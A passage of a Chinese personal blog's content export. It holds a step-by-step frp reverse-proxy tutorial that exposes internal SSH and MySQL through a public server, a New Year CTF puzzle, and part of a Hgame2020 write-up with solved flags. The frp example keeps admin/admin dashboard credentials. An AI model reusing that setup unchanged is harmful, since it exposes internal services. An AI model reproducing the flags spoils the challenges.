nginx</span></code></pre></li></ol><blockquote><p>命令参数：</p><pre><code>-Z 只杀死拥有scontext 的进程-e 要求匹配进程名称-I 忽略小写-g 杀死进程组而不是进程-i 交互模式，杀死进程前先询问用户-l 列出所有的已知信号名称-q 不输出警告信息-s 发送指定的信号-v 报告信号是否成功发送-w 等待进程死亡--help 显示帮助信息--version 显示版本显示</code></pre></blockquote><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p><a href="https://blog.csdn.net/zll_0405/article/details/81208606" target="_blank" rel="noopener">https://blog.csdn.net/zll_0405/article/details/81208606</a></p><p><a href="https://blog.csdn.net/bigdata_mining/article/details/80699180" target="_blank" rel="noopener">https://blog.csdn.net/bigdata_mining/article/details/80699180</a></p><p>etc.</p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> Server </tag>
            
            <tag> tips </tag>
            
            <tag> Configuration </tag>
            
            <tag> firewall </tag>
            
            <tag> 端口 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于frp实现内网穿透</title>
      <link href="/2020/01/29/Server_frp/"/>
      <url>/2020/01/29/Server_frp/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前为了实现远程编程，折腾了一阵子<code>autossh</code>，利用反向代理把内网服务器的ssh映射到了公网端口，详见下面这篇。</p><blockquote><p><a href="https://miaotony.xyz/2019/12/21/Idea_RemoteProgramming/">小想法 | 基于VSCode和ssh实现远程编程/炼丹</a></p></blockquote><p>这次需求扩大了一点，比如说想访问<strong>内网搭建的网站、数据库等等</strong>，但这些都<strong>不能直接在公网进行访问</strong>，<code>autossh</code>就有点不大给力了。</p><p>之前还了解过花生壳、ngrok这些，但是一般需要money要限速或者说不大友好，然后一想大家都在推荐<code>frp</code>，这回就来折腾一下吧！（主要是以后忘了还可以回来看嘻嘻</p><p>总体感受就是，<strong><code>frp</code>搭建起来比<code>autossh</code>方便多了</strong>呀！</p><br><hr><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><h3 id="What-is-frp"><a href="#What-is-frp" class="headerlink" title="What is frp?"></a>What is frp?</h3><blockquote><p><em>frp</em> is a fast reverse proxy to help you expose a local server behind a NAT or firewall to the Internet. As of now, it supports <strong>TCP</strong> and <strong>UDP</strong>, as well as <strong>HTTP</strong> and <strong>HTTPS</strong> protocols, where requests can be forwarded to internal services by domain name.</p><p><em>frp</em> also has a P2P connect mode.</p></blockquote><blockquote><p>frp 是一个可用于内网穿透的高性能的反向代理应用，支持 tcp, udp 协议，为 http 和 https 应用协议提供了额外的能力，且尝试性支持了点对点穿透。</p></blockquote><p><img src="/2020/01/29/Server_frp/architecture.png" alt="architecture"></p><p>FRP，fast reverse proxy。使用 Go 语言开发，支持 Windows、Linux、macOS、ARM 等多平台部署。</p><p>其实简单地说也就是借助一台有公网IP的服务器作为中转，把内外网直接的流量连接起来。</p><p>其开源仓库：<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></p><h3 id="What-should-I-prepare"><a href="#What-should-I-prepare" class="headerlink" title="What should I prepare?"></a>What should I prepare?</h3><p><strong>内网主机（客户端）：</strong>能上互联网（外网），或者说能连上你的公网服务器就行。（但没有公网IP）</p><p>可以是电脑（Windows，MacOS，Linux）/嵌入式设备（如树莓派）…对的，<strong>frp跨平台</strong>。</p><p><strong>公网主机（服务端）：</strong>有公网IP，或者绑定了域名能通过端口访问也行。</p><p>以及</p><p>想<strong>连接内网的你喜欢的设备</strong>。</p><br><hr><br><h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><p>分为<strong>服务器端</strong>和<strong>客户端</strong>两部分。</p><h3 id="下载程序"><a href="#下载程序" class="headerlink" title="下载程序"></a>下载程序</h3><p>根据对应的操作系统及架构，从 <a href="https://github.com/fatedier/frp/releases" target="_blank" rel="noopener">Release</a> 页面下载最新版本的程序。</p><p>目前最新的版本是 <code>v0.31.1</code></p><p>比如Windows64位下载 <a href="https://github.com/fatedier/frp/releases/download/v0.31.1/frp_0.31.1_windows_amd64.zip" target="_blank" rel="noopener">frp_0.31.1_windows_amd64.zip</a>，</p><p>Linux64位一般是这个 <a href="https://github.com/fatedier/frp/releases/download/v0.31.1/frp_0.31.1_linux_amd64.tar.gz" target="_blank" rel="noopener">frp_0.31.1_linux_amd64.tar.gz</a>。</p><p>其他系统/架构的对应下载就好了。</p><p><img src="/2020/01/29/Server_frp/download.png" alt="下载对应的文件"></p><p>将 <strong>frps</strong> 及 <strong>frps.ini</strong> 放到具有公网 IP 的机器上。</p><p>将 <strong>frpc</strong> 及 <strong>frpc.ini</strong> 放到处于内网环境的机器上。</p><h3 id="服务器端的搭建"><a href="#服务器端的搭建" class="headerlink" title="服务器端的搭建"></a>服务器端的搭建</h3><p>可以在服务器上可以用wget下载。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mkdir</span> -p /etc/frp<span class="token function">cd</span> /etc/frp<span class="token function">sudo</span> <span class="token function">wget</span> <span class="token string">"https://github.com/fatedier/frp/releases/download/v0.31.1/frp_0.31.1_linux_amd64.tar.gz"</span><span class="token function">sudo</span> <span class="token function">tar</span> xzvf frp_0.31.1_linux_amd64.tar.gz<span class="token function">sudo</span> <span class="token function">mv</span> frp_0.31.1_linux_amd64/* /etc/frp</code></pre><p>然而国内下载速度感人，大概8M的文件就几KB/s…</p><p>于是还不如直接搭个梯子到外面下载好了再传到服务器上。</p><p>服务器端server嘛，当然用的是 <strong>frps</strong> 及 <strong>frps.ini</strong>。</p><p>完整版的 <code>frps_full.ini</code>里面有很详细的注释，也可以用来参考。</p><br><p>最简单的<strong>配置</strong>就直接这样写</p><pre class=" language-ini"><code class="language-ini"># frps.ini<span class="token selector">[common]</span><span class="token constant">bind_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7000</span></code></pre><p>然后<strong>启动<code>frps</code></strong>（Linux下）</p><pre class=" language-bash"><code class="language-bash">/etc/frp/frps -c /etc/frp/frps.ini</code></pre><p>再去把系统的<strong>防.火|墙打开</strong>，以及阿里云等平台的<strong>安全组规则设好允许入站出站</strong>。</p><blockquote><p>这个firewall搞死我了emmm折腾了老半天最后发现没放行端口……</p><p>后面再写一篇关于firewall配置的。</p></blockquote><p>好了，下面到客户端。</p><hr><h3 id="客户端（内网主机）的搭建"><a href="#客户端（内网主机）的搭建" class="headerlink" title="客户端（内网主机）的搭建"></a>客户端（内网主机）的搭建</h3><p>同理把<code>frp</code>解压的文件放到<code>/etc/frp</code>文件夹下。</p><p>客户端client，用的是 <strong>frpc</strong> 及 <strong>frpc.ini</strong>。</p><pre class=" language-ini"><code class="language-ini"># frpc.ini<span class="token selector">[common]</span><span class="token constant">server_addr</span> <span class="token attr-value"><span class="token punctuation">=</span> x.x.x.x</span><span class="token constant">server_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7000</span><span class="token selector">[ssh]</span><span class="token constant">type</span> <span class="token attr-value"><span class="token punctuation">=</span> tcp</span><span class="token constant">local_ip</span> <span class="token attr-value"><span class="token punctuation">=</span> 127.0.0.1</span><span class="token constant">local_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 22</span><span class="token constant">remote_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7001</span><span class="token selector">[Mysql]</span><span class="token constant">type</span> <span class="token attr-value"><span class="token punctuation">=</span> tcp</span><span class="token constant">local_ip</span> <span class="token attr-value"><span class="token punctuation">=</span> 127.0.0.1   #也可以是局域网中的内网IP</span><span class="token constant">local_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 3306</span><span class="token constant">remote_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7002</span></code></pre><p>其中common里的<code>server_addr</code>是公网主机的公网IP，<code>server_port</code>设成与服务端一样的端口。</p><p>每个方框<code>[.+]</code>里的是name，下面都对应着一个规则，要求不能重名。</p><p><code>type</code>可以是tcp/udp/http/https/stcp/xtcp（具体看官方文档），一般就tcp/http啦。</p><p><code>local_ip</code>和<code>local_port</code>为本地地址及端口。</p><p><code>remote_port</code>为公网的端口，这个可以在服务端进行限制，注意<strong>要在服务端放行这些端口</strong>啊！</p><br><p>客户端可以在多个主机上运行，只要name不重名就行。</p><p>而后<strong>启动客户端</strong></p><pre class=" language-bash"><code class="language-bash">/etc/frp/frpc -c /etc/frp/frpc.ini</code></pre><p>Windows下：</p><pre class=" language-bash"><code class="language-bash">frpc.exe -c frpc.ini</code></pre><p><img src="/2020/01/29/Server_frp/client.png" alt="client"></p><p><code>start proxy success</code>表示启动成功。</p><hr><h3 id="远程访问"><a href="#远程访问" class="headerlink" title="远程访问"></a>远程访问</h3><p>现在就可以直接通过公网IP的7001端口访问内网的ssh，通过7002端口访问内网的Mysql啦！</p><p><strong>远程编程，访问网页，管理数据库</strong>什么的都可以实现啦！</p><p><strong>好棒呀！</strong></p><br><hr><hr><br><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><h3 id="Dashboard"><a href="#Dashboard" class="headerlink" title="Dashboard"></a>Dashboard</h3><p><code>frp</code>的<strong>服务器端</strong>提供了一个在web端<strong>查看运行状态</strong>的展示界面。</p><p>配置如下，在<code>common</code>中添加如下信息：</p><pre class=" language-ini"><code class="language-ini"># frps.ini<span class="token selector">[common]</span><span class="token constant">dashboard_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7500 # 注意开放端口</span># dashboard 用户名密码，默认都为 admin<span class="token constant">dashboard_user</span> <span class="token attr-value"><span class="token punctuation">=</span> admin</span><span class="token constant">dashboard_pwd</span> <span class="token attr-value"><span class="token punctuation">=</span> admin</span></code></pre><p>而后重启服务端，就可以在<code>http://[server_addr]:7500</code> 访问 dashboard 界面，用户名密码默认为 <code>admin</code>。</p><p><img src="/2020/01/29/Server_frp/Dashboard_Overview.png" alt="Dashboard_Overview"></p><p><img src="/2020/01/29/Server_frp/Dashboard_Proxies.png" alt="Dashboard_Proxies"></p><p>还别说，挺好看的唉！</p><p>看了一下，基于<code>vue</code>写的。</p><hr><h3 id="Admin-UI"><a href="#Admin-UI" class="headerlink" title="Admin UI"></a>Admin UI</h3><p>在客户端也提供了一个类似于dashboard的查看状态和管理配置的界面。</p><pre class=" language-ini"><code class="language-ini"># frpc.ini<span class="token selector">[common]</span><span class="token constant">admin_addr</span> <span class="token attr-value"><span class="token punctuation">=</span> 127.0.0.1</span><span class="token constant">admin_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 7400</span><span class="token constant">admin_user</span> <span class="token attr-value"><span class="token punctuation">=</span> admin</span><span class="token constant">admin_pwd</span> <span class="token attr-value"><span class="token punctuation">=</span> admin</span></code></pre><p>然后本地就可以通过 <a href="http://127.0.0.1:7400" target="_blank" rel="noopener">http://127.0.0.1:7400</a> 来访问<strong>查看状态</strong>和<strong>修改配置</strong>了。</p><p>这里如果想通过内网IP（如<code>192.168.1.66</code>）查看的话，需要把<code>admin_addr</code>修改为 <code>0.0.0.0</code>（允许所有访问），或者对应的本地IP（如<code>192.168.1.66</code>）。</p><p>同时也需要在本地的firewall打开这个端口，否则在内网的其他主机也无法访问。（折腾了老半天才发现emmm</p><p>当然，想要在公网访问的话，把7400端口映射到外网就好了，不过安全起见算了吧。</p><p><img src="/2020/01/29/Server_frp/AdminUI.png" alt="AdminUI"></p><hr><h3 id="开启加密、压缩"><a href="#开启加密、压缩" class="headerlink" title="开启加密、压缩"></a>开启加密、压缩</h3><p>在客户端加入<code>use_encryption</code> 和 <code>use_compression</code>这两个参数。</p><pre class=" language-ini"><code class="language-ini"># frpc.ini<span class="token selector">[ssh]</span><span class="token constant">type</span> <span class="token attr-value"><span class="token punctuation">=</span> tcp</span><span class="token constant">local_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 22</span><span class="token constant">remote_port</span> <span class="token attr-value"><span class="token punctuation">=</span> 6000</span><span class="token constant">use_encryption</span> <span class="token attr-value"><span class="token punctuation">=</span> true</span><span class="token constant">use_compression</span> <span class="token attr-value"><span class="token punctuation">=</span> true</span></code></pre><hr><h3 id="开机自启"><a href="#开机自启" class="headerlink" title="开机自启"></a>开机自启</h3><p>这次直接把<code>frp</code>作为一个service好了，用<code>systemd</code>好了！</p><h4 id="服务端："><a href="#服务端：" class="headerlink" title="服务端："></a>服务端：</h4><p>新建一个文件，名叫 <code>frps.service</code>，写入</p><pre class=" language-ini"><code class="language-ini"># frps.service<span class="token selector">[Unit]</span><span class="token constant">Description</span><span class="token attr-value"><span class="token punctuation">=</span>Frp Server</span><span class="token constant">After</span><span class="token attr-value"><span class="token punctuation">=</span>syslog.target network.target</span><span class="token constant">Wants</span><span class="token attr-value"><span class="token punctuation">=</span>network.target</span><span class="token selector">[Service]</span><span class="token constant">Type</span><span class="token attr-value"><span class="token punctuation">=</span>simple</span><span class="token constant">ExecStart</span><span class="token attr-value"><span class="token punctuation">=</span>/etc/frp/frps -c /etc/frp/frps.ini</span><span class="token constant">ExecStop</span><span class="token attr-value"><span class="token punctuation">=</span>/usr/bin/killall frps</span>#启动失败1分钟后再次启动<span class="token constant">RestartSec</span><span class="token attr-value"><span class="token punctuation">=</span>1min</span><span class="token constant">KillMode</span><span class="token attr-value"><span class="token punctuation">=</span>control-group</span>#重启控制：总是重启<span class="token constant">Restart</span><span class="token attr-value"><span class="token punctuation">=</span>always</span><span class="token selector">[Install]</span><span class="token constant">WantedBy</span><span class="token attr-value"><span class="token punctuation">=</span>multi-user.target</span></code></pre><h4 id="客户端："><a href="#客户端：" class="headerlink" title="客户端："></a>客户端：</h4><p><code>frpc.service</code></p><pre class=" language-ini"><code class="language-ini"># frpc.service<span class="token selector">[Unit]</span><span class="token constant">Description</span><span class="token attr-value"><span class="token punctuation">=</span>Frp Client</span><span class="token constant">After</span><span class="token attr-value"><span class="token punctuation">=</span>syslog.target network.target</span><span class="token constant">Wants</span><span class="token attr-value"><span class="token punctuation">=</span>network.target</span><span class="token selector">[Service]</span><span class="token constant">Type</span><span class="token attr-value"><span class="token punctuation">=</span>simple</span><span class="token constant">ExecStart</span><span class="token attr-value"><span class="token punctuation">=</span>/etc/frp/frpc -c /etc/frp/frpc.ini</span><span class="token constant">ExecStop</span><span class="token attr-value"><span class="token punctuation">=</span>/usr/bin/killall frpc</span>#启动失败1分钟后再次启动<span class="token constant">RestartSec</span><span class="token attr-value"><span class="token punctuation">=</span>1min</span><span class="token constant">KillMode</span><span class="token attr-value"><span class="token punctuation">=</span>control-group</span>#重启控制：总是重启<span class="token constant">Restart</span><span class="token attr-value"><span class="token punctuation">=</span>always</span><span class="token selector">[Install]</span><span class="token constant">WantedBy</span><span class="token attr-value"><span class="token punctuation">=</span>multi-user.target</span></code></pre><p>而后将此文件放到 服务器端和客户端的<strong><code>/etc/systemd/system/</code> 目录</strong>下。</p><p>先<code>killall frps</code>（或frpc），再调用</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl <span class="token function">enable</span> frps.service</code></pre><p>或</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl <span class="token function">enable</span> frpc.service</code></pre><p>这样就成功配置了开机自启。</p><p>而且可以通过下列命令进行管理：</p><pre class=" language-bash"><code class="language-bash"><span class="token function">sudo</span> systemctl start frpc.service    <span class="token comment" spellcheck="true"># 启动</span><span class="token function">sudo</span> systemctl stop frpc.service     <span class="token comment" spellcheck="true"># 停止</span><span class="token function">sudo</span> systemctl restart frpc.service  <span class="token comment" spellcheck="true"># 重启</span><span class="token function">sudo</span> systemctl status frpc.service   <span class="token comment" spellcheck="true"># 查看状态</span></code></pre><p>frps同理。</p><p><img src="/2020/01/29/Server_frp/service.png" alt="查看状态"></p><br><hr><hr><br><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>frp很强大的呢！</p><p>比如还可以在一定情况下绕过服务器实现点对点P2P连接，不过前提是内网和你的设备两端都要装frpc客户端。</p><p>更多且看<strong>官方文档</strong>：<a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></p><p>关键这个<strong>配置起来贼方便啊</strong>！</p><p>于是这样就可以通过公网IP，访问到你内网的资源啦，嘻嘻嘻~</p><p>好了，完事！</p><p>溜了溜了。</p><hr><hr><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li>官方仓库及介绍 <a href="https://github.com/fatedier/frp" target="_blank" rel="noopener">https://github.com/fatedier/frp</a></li><li>官方中文文档 <a href="https://github.com/fatedier/frp/blob/master/README_zh.md" target="_blank" rel="noopener">https://github.com/fatedier/frp/blob/master/README_zh.md</a></li><li><a href="https://www.iplaysoft.com/frp.html" target="_blank" rel="noopener">https://www.iplaysoft.com/frp.html</a></li><li>Frp后台自动启动的几个方法 <a href="https://blog.csdn.net/x7418520/article/details/81077652" target="_blank" rel="noopener">https://blog.csdn.net/x7418520/article/details/81077652</a></li><li>Systemd 服务管理教程 <a href="https://cloud.tencent.com/developer/article/1516125" target="_blank" rel="noopener">https://cloud.tencent.com/developer/article/1516125</a></li><li><a href="https://miaotony.xyz/2019/12/21/Idea_RemoteProgramming/">小想法 | 基于VSCode和ssh实现远程编程/炼丹</a></li></ol><p>还看到过一个免费的内网穿透服务，Sakura Frp <a href="https://www.natfrp.com/" target="_blank" rel="noopener">https://www.natfrp.com/</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> Tech </category>
          
          <category> Server </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Tech </tag>
            
            <tag> 小想法 </tag>
            
            <tag> Server </tag>
            
            <tag> 穿透 </tag>
            
            <tag> 内网 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2020鼠年快乐！来玩红包闯关吧！</title>
      <link href="/2020/01/25/CTF_2020HappyChineseNewYear/"/>
      <url>/2020/01/25/CTF_2020HappyChineseNewYear/</url>
      
        <content type="html"><![CDATA[<h2 id="鼠年快乐"><a href="#鼠年快乐" class="headerlink" title="鼠年快乐"></a>鼠年快乐</h2><p>又是一年春来到，鼠年的钟声敲响了！</p><p><strong>鼠你健康，鼠你平安，鼠你快乐喵~</strong></p><p>这一年过的太难了，还要感谢大家的陪伴哈！</p><p>最近新型冠状病毒感染的肺炎来了，公共场所都关闭了emmm</p><p><strong>武汉加油！中国加油！</strong></p><p><strong>过年了，大家都要健康快乐呀！</strong></p><br><hr><br><h2 id="红包闯关"><a href="#红包闯关" class="headerlink" title="红包闯关"></a>红包闯关</h2><p>说到这个红包闯关，最开始是听说有学长的红包闯关，FJJ 学长也弄过一个，元旦的时候白师傅扔了个RSA的密码红包，Milkice 的年终总结里也出了道红包题。</p><p>反正就挺有意思的嘛23333</p><p>我的话其实元旦的时候就想弄了。</p><p>不过那时候一堆考试，去年12.31下午六点多才考完高频，后面又要考DSP，根本没空出题……</p><p>所以，不如趁着春节出道题玩玩呀！</p><br><hr><br><h2 id="题目来了"><a href="#题目来了" class="headerlink" title="题目来了"></a>题目来了</h2><p>就出个 <strong>Misc</strong> 的题吧，花了一番心思，做题看脑洞吧，可以好好玩玩！</p><p>社会主义核心价值观深入人心，那我们就从这开始吧！</p><pre><code>自由诚信自由自由文明和谐文明自由爱国自由敬业和谐自由自由自由平等自由自由爱国自由敬业平等爱国平等和谐和谐公正和谐和谐自由友善公正自由友善自由自由友善法治自由公正平等爱国平等爱国自由敬业和谐和谐和谐和谐自由友善敬业平等富强自由平等平等爱国自由爱国平等民主和谐公正自由友善公正和谐文明自由公正和谐平等自由友善自由平等自由自由法治平等民主和谐和谐平等和谐自由敬业平等公正和谐文明自由自由自由诚信民主自由诚信文明和谐和谐自由平等自由友善敬业自由诚信自由平等自由自由法治平等民主和谐自由自由友善公正自由友善法治自由友善法治平等公正和谐和谐平等法治平等法治平等敬业自由诚信文明自由诚信和谐自由诚信自由自由友善自由平等法治自由法治平等法治平等友善自由平等自由自由平等自由友善爱国平等友善自由平等爱国平等爱国自由法治自由友善公正和谐和谐平等自由自由友善法治平等友善自由平等公正自由法治自由敬业和谐文明自由诚信文明平等富强自由法治自由诚信富强平等敬业平等自由自由法治和谐自由平等自由自由诚信文明自由诚信自由平等文明平等自由自由法治自由和谐和谐和谐平等自由自由法治自由诚信和谐平等文明平等法治自由自由平等法治和谐文明和谐和谐自由友善平等自由诚信和谐平等诚信富强平等法治自由法治平等法治平等诚信富强自由友善公正自由友善平等自由友善法治平等友善自由平等法治自由自由平等法治平等友善自由和谐和谐自由法治自由法治自由诚信和谐平等爱国平等平等自由和谐自由诚信和谐自由诚信文明平等自由自由法治自由文明自由自由自由自由自由敬业和谐文明和谐和谐自由公正自由法治自由敬业平等诚信富强平等自由自由法治自由友善法治平等友善自由平等自由自由公正和谐平等自由法治平等法治平等和谐平等敬业自由友善公正平等富强自由公正平等友善自由平等平等自由爱国自由敬业和谐和谐自由诚信文明自由友善法治</code></pre><p>总共有<strong>4个Flag</strong>，对应着4个Alipay红包。</p><p><strong>形式都是 <code>MIAO{.+}</code></strong>，可能是<strong>纯数字</strong>或<strong>纯汉字</strong>。</p><p>如果红包过期了，1月31日前直接私戳把flag发给我就好了喵！</p><p>后面再发出题记录和WP。</p><p><strong>注意解出来的flag不要随便发给别人啊！！！</strong></p><p>（如果写WP的话过几天再发出来吧。</p><h3 id="Hint"><a href="#Hint" class="headerlink" title="Hint"></a>Hint</h3><p>闯关需要一关一关过嘛，可能有点难度，给点小提示吧。</p><ol><li>套娃挺好玩的，比如这回一个文件里套了好几个，flag就越埋越深23333。</li><li>编码家族里，<code>base64</code>挺常用的，但别只想着它吧。哦对了，社会主义核心价值观也可以用来编码的呢。</li><li>Tony偶尔会和小伙伴发邮件交流。</li><li>Tony偶尔用<code>PhotoShop</code>修修图什么的，可能还会往图片里藏点什么有意思的东西，当然工具不只是PS。</li><li>十六进制编辑器在手，有可能哪天一不小心把文件改错了就打不开了或者说损坏了。</li><li>二维码是个好东西，能传递的信息不只是网址，还有……但是前提是你能找到它。</li><li>Tony喜欢用<code>Python</code>来码代码，很多现成的库贼方便。而且编译后……</li><li>中文的话有可能需要借助<code>Unicode</code>编码。</li><li>一步步深入还会有进一步的提示，备注是个好东西。</li><li>（我也不记得了，自己想吧2333</li></ol><h3 id="Just-have-fun！"><a href="#Just-have-fun！" class="headerlink" title="Just have fun！"></a><strong><em>Just have fun！</em></strong></h3><p><strong>有问题欢迎留言，或者私戳呀！</strong></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Life </tag>
            
            <tag> CTF </tag>
            
            <tag> 红包闯关 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF | Hgame2020 Week1 WriteUp</title>
      <link href="/2020/01/23/CTF_Hgame2020/"/>
      <url>/2020/01/23/CTF_Hgame2020/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天玩了玩杭州电子科技大学的<strong>Hgame2020</strong>，还别说，有点意思2333。</p><p><strong>平台网址：</strong></p><p><a href="https://hgame.vidar.club/" target="_blank" rel="noopener">https://hgame.vidar.club/</a></p><p>Flag格式：<code>hgame{.+}</code> </p><br><p><strong>20200125 更新：</strong></p><p>官方WP地址：<a href="https://github.com/vidar-team/Hgame2020_writeup" target="_blank" rel="noopener">https://github.com/vidar-team/Hgame2020_writeup</a></p><hr><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="签到题"><a href="#签到题" class="headerlink" title="签到题"></a>签到题</h3><pre><code>Li0tIC4uLi0tIC4tLi4gLS4tLiAtLS0tLSAtLSAuIC4uLS0uLSAtIC0tLSAuLi0tLi0gLi4tLS0gLS0tLS0gLi4tLS0gLS0tLS0gLi4tLS4tIC4uLi4gLS0uIC4tIC0tIC4uLi0t</code></pre><p>base64解码得到</p><p><code>.-- ...-- .-.. -.-. ----- -- . ..--.- - --- ..--.- ..--- ----- ..--- ----- ..--.- .... --. .- -- ...--</code></p><p>一看就是摩斯电码，加入分隔符后解码得到flag</p><p><code>W3LC0ME_TO_2020_HGAM3</code></p><blockquote><p>在线解密摩斯密码 <a href="http://www.atool9.com/morse.php" target="_blank" rel="noopener">www.atool9.com/morse.php</a></p></blockquote><h3 id="壁纸"><a href="#壁纸" class="headerlink" title="壁纸"></a>壁纸</h3><p>解压得到图片<code>Pixiv@純白可憐.jpg</code>，foremost提取得到一个zip压缩文件。备注提示 <code>Password is picture ID.</code></p><p><img src="/2020/01/23/CTF_Hgame2020/misc_wallpaper.png" alt="misc_wallpaper"></p><p>本来还以为是在图片的文件里，而且还找到了一个id属性，然而并不是。</p><p>上网查了一下<code>純白可憐</code>，发现是P站画家，看了一篇介绍原来每张图片有个编号来着。</p><p>试了试百度搜图，出来的画风有点不对劲emmm。干脆直接上P站搜，然后在页面上找到了这张图。</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_wallpaper2.png" alt="misc_wallpaper2"></p><p>（还别说，挺好看的哇，还是个中国画师喵。</p><p><strong>天意</strong> <a href="https://www.pixiv.net/artworks/76953815" target="_blank" rel="noopener">https://www.pixiv.net/artworks/76953815</a></p><p>得到ID <code>76953815</code>，作为密码解压<code>flag.txt</code>（这么短还全数字，其实可以暴力破解的），得到</p><pre><code>\u68\u67\u61\u6d\u65\u7b\u44\u6f\u5f\u79\u30\u75\u5f\u4b\u6e\u4f\u57\u5f\u75\u4e\u69\u43\u30\u64\u33\u3f\u7d</code></pre><p>Unicode啦，转ASCII（用的是<strong>NATIVE转ASCII</strong>来着）得到flag</p><p><code>hgame{Do_y0u_KnOW_uNiC0d3?}</code></p><hr><h3 id="克苏鲁神话"><a href="#克苏鲁神话" class="headerlink" title="克苏鲁神话"></a>克苏鲁神话</h3><p>明文攻击得到了解密后的zip文件。</p><p><img src="/2020/01/23/CTF_Hgame2020/misc_kesulu.png" alt=""></p><p>得到加密的 <code>The Call of Cthulhu.doc</code>文件。根据 <code>Bacon.txt</code>文件提示寻找密码。</p><pre><code>of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd.*Password in capital letters.</code></pre><p>然而不成功，不知道怎么做下去了嘤嘤嘤。</p><pre class=" language-python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> s<span class="token operator">=</span><span class="token string">'of SuCh GrEAt powers OR beiNGS tHere may BE conCEivAbly A SuRvIval oF HuGely REmOTE periOd'</span><span class="token operator">>></span><span class="token operator">></span> s1<span class="token operator">=</span><span class="token punctuation">[</span>i <span class="token keyword">for</span> i <span class="token keyword">in</span> s <span class="token keyword">if</span> i<span class="token operator">>=</span><span class="token string">'A'</span> <span class="token operator">and</span> i<span class="token operator">&lt;=</span><span class="token string">'Z'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> s1<span class="token punctuation">[</span><span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'N'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'B'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'C'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">,</span> <span class="token string">'S'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'I'</span><span class="token punctuation">,</span> <span class="token string">'F'</span><span class="token punctuation">,</span> <span class="token string">'H'</span><span class="token punctuation">,</span> <span class="token string">'G'</span><span class="token punctuation">,</span> <span class="token string">'R'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">,</span> <span class="token string">'T'</span><span class="token punctuation">,</span> <span class="token string">'E'</span><span class="token punctuation">,</span> <span class="token string">'O'</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> <span class="token string">''</span><span class="token 